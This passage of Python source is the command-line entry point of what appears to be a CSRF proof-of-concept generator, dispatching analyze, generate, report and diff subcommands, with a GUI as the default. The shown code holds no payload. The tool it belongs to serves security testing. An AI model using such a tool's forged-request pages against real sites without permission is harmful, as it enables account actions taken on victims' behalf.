    p.add_argument("-o", "--output", help="Output file path")
    return p


def main(argv: Optional[list[str]] = None) -> int:
    argv = sys.argv[1:] if argv is None else argv

    # Decide which parsing style to use: if the first non-flag token is one
    # of the known subcommands, use the subcommand parser; otherwise use the
    # flat, spec-compatible style (or launch the GUI if no request is given).
    first_positional = next((a for a in argv if not a.startswith("-")), None)

    if first_positional in SUBCOMMANDS:
        parser = build_subcommand_parser()
        args = parser.parse_args(argv)
        setup_logging(args.verbose)
        config = load_config(args.config)

        if args.gui:
            launch_gui(config)
            return 0

        try:
            if args.command == "analyze":
                return cmd_analyze(args, config)
            if args.command == "generate":
                return cmd_generate(args, config)
            if args.command == "report":
                return cmd_report(args, config)
            if args.command == "diff":
                return cmd_diff(args, config)
        except CSRFGenError as exc:
            logger.error(str(exc))
            return 1
        except Exception:  # noqa: BLE001
            logger.exception("Unexpected error")
            return 1

    parser = build_flat_parser()
    args = parser.parse_args(argv)
    setup_logging(args.verbose)
    config = load_config(args.config)

    if args.gui:
        launch_gui(config)
        return 0

    if args.request_file:
        try:
            if args.generate:
                ns = argparse.Namespace(request_file=args.request_file, generate=args.generate,
                                         no_auto_submit=args.no_auto_submit, output=args.output)
                return cmd_generate(ns, config)
            if args.report:
                ns = argparse.Namespace(request_file=args.request_file, report=args.report,
                                         output=args.output)
                return cmd_report(ns, config)
            # Default to analyze (covers explicit --analyze and bare "file.txt")
            ns = argparse.Namespace(request_file=args.request_file, tokens=args.tokens)
            return cmd_analyze(ns, config)
        except CSRFGenError as exc:
            logger.error(str(exc))
            return 1
        except Exception:  # noqa: BLE001
            logger.exception("Unexpected error")
            return 1

    # No arguments at all -> launch GUI by default (original tool behaviour)
    launch_gui(config)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
